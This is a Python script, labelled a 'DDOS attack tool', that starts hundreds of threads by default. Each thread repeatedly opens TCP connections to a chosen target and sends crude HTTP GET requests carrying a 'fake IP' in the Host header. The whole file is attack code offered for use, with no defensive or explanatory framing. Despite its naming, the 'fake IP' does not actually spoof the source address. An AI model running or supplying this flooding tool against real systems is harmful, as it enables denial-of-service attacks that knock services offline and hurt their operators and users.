import socket
import threading
import argparse

def attack(target, fake_ip, port):
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target, port))
			s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
			s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
			s.close()

		except socket.error as e:
			print(f"Error: {e}")
			break

def start_attack(target, fake_ip, port, threads):
	for i in range(threads):
		thread = threading.Thread(target=attack, args=(target, fake_ip, port))
		thread.start()

if __name__ == '__main__':
	parser=argparse.ArgumentParser(description='DDOS attack tool')
	parser.add_argument('target', type=str, help='Target IP or Domain')
	parser.add_argument('fake_ip', type=str, help='Fake IP to use')
	parser.add_argument('port', type=int, help='Port number')
	parser.add_argument('--verbose', action='store_true', help='Verbosity')
	parser.add_argument('--threads', type=int, default=500, help='Threads to send')
	args=parser.parse_args()

	print(f'DDOS Attack Starting on {args.target} target with {args.threads} threads from {args.fake_ip} IP ............................')
	start_attack(args.target, args.fake_ip, args.port, args.threads)
